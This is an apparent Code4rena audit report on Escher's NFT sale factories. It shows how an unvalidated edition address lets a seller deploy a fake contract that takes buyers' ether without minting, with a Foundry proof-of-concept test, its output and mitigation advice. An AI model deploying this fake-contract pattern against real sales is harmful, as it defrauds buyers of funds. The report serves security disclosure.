# Original link
https://github.com/code-423n4/2022-12-escher-findings/issues/29
# Lines of code

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPriceFactory.sol#L29-L38
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDAFactory.sol#L29-L42
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEditionFactory.sol#L29-L38
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPrice.sol#L57-L67
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L58-L89
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L57-L94


# Vulnerability details

## Impact

In Solidity, any address can be cast to a contract, regardless of whether the code at the address represents the contract type being cast. This can cause problems, especially when the author of the contract is trying to hide malicious code. Let’s illustrate this with an example. [ref](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#the-vulnerability-6)

The following exploit applies to the following contracts: ```FixedPriceFactory.sol```, ```LPDAFactory.sol``` and ```OpenEditionFactory.sol```.

I will give example only for ```FixedPriceFactory```.

Alice can call ```createFixedSale``` from the ```FixedPriceSaleFactory``` contract. But ```Sale.edition``` can be a malicious contract which doesn't implement ```IEscher721``` interface, and functions will not behave as expected. Bob will try to call the buy function from ```FixedPrice``` contract, but the ```mint``` function may be different from ```IEscher721```'s mint function.

All users can see the malicious contracts address when it is passed as parameter in ```createFixedSale```. To further obfuscate the contract, Alice doesn't approve the contract's source code in the blockchain explorer in order to hide it's real purpose. The source code can be obtained from the bytecode, but it is gonna take extra time and it is a more difficult task for a common blockchain user.


## Proof of Concept

Imagine the following case:

1. Alice deploys the following NFT Escher contract:

```
contract FakeNft {
    function mint(address, uint256) public {
        console.log("EXPLOIT");
        // malicious code here
    }

    function hasRole(bytes32, address) public pure returns (bool) {
        return true;
    }
}
```

2. Alice calls ```createFixedSale``` with the following ```Sale``` struct:

```
sale {
    uint48 currentId: 1
    uint48 finalId: 3
    address edition: Address of the contract from step 1
    uint96 price: 1 ether
    address payable saleReceiver: Sale creator address
    uint96 startTime: block.timestamp
}

fixedPriceFactory.createFixedSale(sale)
```

The following [require](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPriceFactory.sol#L30) will pass because ```hasRole``` function of malicious contract will return ```true``` regardless of what the parameters are.
Then ```FixedPrice``` will [initialize](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPriceFactory.sol#L35) with the given ```sale``` struct.

3. Bob calls ```buy``` function with amount ```1``` and sends the NFT price which is ```1 ether```.
3.1 Function creates ```IEscher721``` contract
```IEscher721 nft = IEscher721(sale_.edition); // remember - the edition contract is malicious``` 
3.2 Then it will invoke ```mint``` function of ```nft```
```nft.mint(msg.sender, x); // it will call the mint function of the contract from step 1 which does absolutely nothing```
3.3 The function will continue to behave normally because there are no checks and the ether will be sent.

### PoC Test 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {FixedPriceFactory} from "src/minters/FixedPriceFactory.sol";
import {FixedPrice} from "src/minters/FixedPrice.sol";

contract FakeNft is Test {
    function mint(address, uint256) public {
        console.log("EXPLOIT");
        // malicious code here
    }

    function hasRole(bytes32, address) public pure returns (bool) {
        return true;
    }
}

contract PoC is Test {
    FakeNft public nft;
    FixedPriceFactory public fixedPriceFactory;
    FixedPrice public fixedPrice;

    function setUp() public {
        vm.prank(address(1337));

        nft = new FakeNft();
        fixedPriceFactory = new FixedPriceFactory();
    }

    function test_CreateFixedSale() public {
        FixedPrice.Sale memory sale = FixedPrice.Sale(
            1,
            3,
            address(nft),
            1 ether,
            payable(address(1337)),
            uint96(block.timestamp)
        );

        fixedPrice = FixedPrice(fixedPriceFactory.createFixedSale(sale));
        vm.warp(sale.startTime + 100);

        fixedPrice.buy{value: 1 ether}(1);
    }
}

```

### PoC Test result

```
Running 1 test for test/ExternalContractRef.t.sol:PoC
[PASS] test_CreateFixedSale() (gas: 220804)
Logs:
  EXPLOIT

Test result: ok. 1 passed; 0 failed; finished in 1.82ms
```

It applies to the contracts listed above, the differences are the ```sale``` struct and checks.

## Tools Used

Forge, Manual

## Recommended Mitigation Steps

One solution is to create new escher contract directly in ```createFixedSale``` function, this will guarantee that the ```IEscher721``` contract will not be malicious and will act as expected.

The other solution is redesigning some parts of the source code. 

refer to [preventative-techniques](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#preventative-techniques-6).
